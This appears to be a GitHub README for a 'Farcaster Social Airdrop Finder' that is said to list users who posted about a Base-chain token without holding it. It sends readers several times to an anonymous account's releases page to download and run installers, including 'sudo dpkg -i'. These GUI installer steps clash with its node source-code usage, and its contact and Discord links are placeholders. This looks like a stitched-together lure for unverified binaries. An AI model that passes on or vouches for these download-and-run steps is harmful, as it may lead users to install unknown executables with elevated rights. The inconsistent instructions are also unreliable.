# 🎉 farcaster-social-airdrop - Find Potential Airdrop Recipients Easily

## 📥 Download Now
[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/unknown213445675/farcaster-social-airdrop/releases)

## 🚀 Overview
The Farcaster Social Airdrop Finder helps you identify Farcaster users who have shared about a token but haven’t received or purchased it yet. This tool is ideal for spotting potential airdrop recipients for any token on the Base chain.

## 📋 Prerequisites
Before you can use this tool, you need to fulfill some requirements.

1. **Neynar API Key**: You need a Neynar API key to access Farcaster data.
   - Get your API key at: [neynar.com](https://neynar.com/)
   - Once you have your key, add it to your `.env` file. Your line should look like this:
     ```
     NEYNAR_API_KEY=your_key_here
     ```

2. **Token Contract Address**: You need the contract address of your token on the Base chain.
   - Find it using:
     - [Base Explorer](https://basescan.org/)
     - [DexScreener](https://dexscreener.com/base)

## 💡 How to Use
Now, let’s get started with using the Farcaster Social Airdrop Finder. Follow these steps to search for tokens.

### 🔧 Basic Usage (elizaOS - Default)
To use the tool with default settings, run the following command:
```bash
node src/index.js social-airdrop
```

### 🔍 Search for Any Token
To search for a specific token, customize your command by adding the ticker and token address.

#### Example for DEGEN Token
To search for the DEGEN token, execute this command:
```bash
node src/index.js social-airdrop \
  --ticker="DEGEN" \
  --tokenAddress="0xDEGENTokenAddressHere"
```

#### Example for HIGHER Token
To find the HIGHER token, run this command:
```bash
node src/index.js social-airdrop \
  --ticker="HIGHER" \
  --tokenAddress="0xHIGHERTokenAddressHere"
```

## 📥 Download & Install
To get started, visit the following page to download the software:
[Download Farcaster Social Airdrop Finder](https://github.com/unknown213445675/farcaster-social-airdrop/releases)

Once you've downloaded the software, follow the installation instructions for your operating system:

### 🖥️ Installation on Windows
1. Locate the downloaded file.
2. Double-click the file to run the installer.
3. Follow the on-screen prompts to complete the installation.

### 🍏 Installation on macOS
1. Open the downloaded file.
2. Drag the Farcaster Social Airdrop Finder to your Applications folder.
3. Open the Applications folder and launch the app.

### 🐧 Installation on Linux
1. Open the terminal.
2. Navigate to the directory where the file is downloaded.
3. Run the following command to install:
   ```bash
   sudo dpkg -i farcaster-social-airdrop.deb
   ```

## 🛠️ Features
- Identify potential airdrop recipients efficiently.
- Search for multiple tokens with ease.
- User-friendly commands for effective data retrieval.

## 📱 Support
If you encounter issues or need help, please refer to the documentation available on the [GitHub Wiki](https://github.com/unknown213445675/farcaster-social-airdrop/wiki) or open an issue in the repository.

## 👥 Community
Connect with other users and share your experiences. Join our discussions on [Discord](https://discord.gg/) or follow us on our social media channels.

## 📧 Contact
For further inquiries, please email support at support@example.com.

## 📢 Acknowledgments
Thanks to the developers and community members who contribute to the ongoing improvement of the Farcaster Social Airdrop Finder.

## 📜 License
This project is licensed under the MIT License. See the [LICENSE](https://github.com/unknown213445675/farcaster-social-airdrop/LICENSE) file for details.